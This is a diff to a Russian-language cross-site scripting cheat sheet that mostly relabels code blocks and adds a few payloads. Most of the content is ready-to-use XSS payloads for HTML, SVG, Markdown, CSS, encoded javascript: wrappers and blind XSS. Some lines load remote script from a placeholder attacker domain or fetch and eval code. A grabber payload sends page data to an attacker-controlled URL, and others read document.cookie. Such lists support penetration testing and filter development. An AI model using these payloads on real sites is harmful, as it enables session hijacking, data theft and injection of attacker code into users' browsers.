@@ -175,13 +175,28 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 | [XSpear](https://github.com/hahwul/XSpear) | Похож на Dalfox, но на Ruby |
 | [domdig](https://github.com/fcavallarin/domdig) | Тестер XSS на базе Headless Chrome |
 
+# Контексты межсайтового скриптинга (XSS)
+
+
+
+
+
+
+
+
+
+
+
 # XSS в HTML/приложениях
 
 ## Распространённые полезные нагрузки
-
+**Кастом:**
+```javascript
+location='/site/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'
+```
 **Базовые полезные нагрузки:**
 
-```html
+```javascript
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
@@ -194,7 +209,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 **Полезные нагрузки с тегом `<img>`:**
 
-```html
+```javascript
 <img src=x onerror=alert('XSS');>
 <img src=x onerror=alert('XSS')//
 <img src=x onerror=alert(String.fromCharCode(88,83,83));>
@@ -207,7 +222,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 **Полезные нагрузки с тегом `<svg>`:**
 
-```html
+```javascript
 <svgonload=alert(1)>
 <svg/onload=alert('XSS')>
 <svg onload=alert(1)//
@@ -218,11 +233,12 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 <svg><script href=data:,alert(1) />
 <svg><script>alert('33')
 <svg><script>alert&lpar;'33'&rpar;
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
 ```
 
 **Полезные нагрузки с тегом `<div>`:**
 
-```html
+```javascript
 <div onpointerover="alert(45)">MOVE HERE</div>
 <div onpointerdown="alert(45)">MOVE HERE</div>
 <div onpointerenter="alert(45)">MOVE HERE</div>
@@ -232,11 +248,14 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 <div onpointerup="alert(45)">MOVE HERE</div>
 ```
 
----
+**Полезные нагрузки с тегом `href` тега `<a>`:**
 
+```javascript
+<a href="javascript:alert(document.domain)">
+```
 ## XSS с использованием HTML5-тегов
 
-```html
+```javascript
 <body onload=alert(/XSS/.source)>
 <input autofocus onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
@@ -259,7 +278,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ## XSS с использованием удалённого JS
 
-```html
+```javascript
 <svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
 <script src=14.rs>
 <!-- Можно указать произвольную полезную нагрузку через 14.rs/#payload -->
@@ -270,7 +289,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ## XSS в скрытых полях (Hidden Input)
 
-```html
+```javascript
 <input type="hidden" accesskey="X" onclick="alert(1)">
 <!-- Используйте CTRL+SHIFT+X для активации onclick -->
 
@@ -282,7 +301,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ## XSS при выводе в верхнем регистре
 
-```html
+```javascript
 <IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
 ```
 
@@ -292,7 +311,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 На основе источника (sink) DOM XSS:
 
-```html
+```javascript
 #"><img src=/ onerror=alert(2)>
 ```
 
@@ -311,13 +330,13 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ## Обёртка javascript:
 
-```html
+```javascript
 javascript:prompt(1)
 ```
 
 **Кодировки:**
 
-```html
+```javascript
 %26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
 
 &#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
@@ -325,7 +344,7 @@ javascript:prompt(1)
 
 **Hex/Octal кодирование:**
 
-```html
+```javascript
 \x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
 \u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
 \152\141\166\141\163\143\162\151\160\164\072alert(1)
@@ -333,7 +352,7 @@ javascript:prompt(1)
 
 **Символы новой строки:**
 
-```html
+```javascript
 java%0ascript:alert(1)   - LF (\n)
 java%09script:alert(1)   - Horizontal tab (\t)
 java%0dscript:alert(1)   - CR (\r)
@@ -341,7 +360,7 @@ java%0dscript:alert(1)   - CR (\r)
 
 **Использование escape-символов:**
 
-```html
+```javascript
 \j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
 ```
 
@@ -356,7 +375,7 @@ javascript://anything%0D%0A%0D%0Awindow.alert(1)
 
 ## Обёртка data:
 
-```html
+```javascript
 data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
@@ -366,7 +385,7 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 
 ## Обёртка vbscript (только Internet Explorer)
 
-```html
+```javascript
 vbscript:msgbox("XSS")
 ```
 
@@ -436,7 +455,6 @@ vbscript:msgbox("XSS")
 
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
@@ -479,7 +497,7 @@ vbscript:msgbox("XSS")
 
 ## XSS в Markdown
 
-```markdown
+```javascript
 [a](javascript:prompt(document.cookie))
 [a](j a v a s c r i p t:prompt(document.cookie))
 [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
@@ -490,7 +508,7 @@ vbscript:msgbox("XSS")
 
 ## XSS в CSS
 
-```html
+```javascript
 <!DOCTYPE html>
 <html>
 <head>
@@ -513,7 +531,7 @@ div  {
 
 Если целевой источник — `*` (звёздочка), сообщение может быть отправлено на любой домен, имеющий ссылку на дочернюю страницу:
 
-```html
+```javascript
 <html>
 <body>
     <input type=button value="Click Me" id="btn">
@@ -552,7 +570,7 @@ document.getElementById('btn').onclick = function(e){
 
 **Полезные нагрузки:**
 
-```html
+```javascript
 "><script src="https://js.rip/[ATTACKER.DOMAIN.TLD]"></script>
 "><script src=//[ATTACKER.DOMAIN.TLD]></script>
 <script>$.getScript("//[ATTACKER.DOMAIN.TLD]")</script>
@@ -587,11 +605,11 @@ document.getElementById('btn').onclick = function(e){
 
 ## Советы
 
-Используйте перехватчик данных и однострочный HTTP-сервер для подтверждения существования Blind XSS перед развёртыванием тяжёлых инструментов.
+Использовать перехватчик данных и однострочный HTTP-сервер для подтверждения существования Blind XSS перед развёртыванием тяжёлых инструментов.
 
 **Полезная нагрузка:**
 
-```html
+```javascript
 <script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>
 ```
 
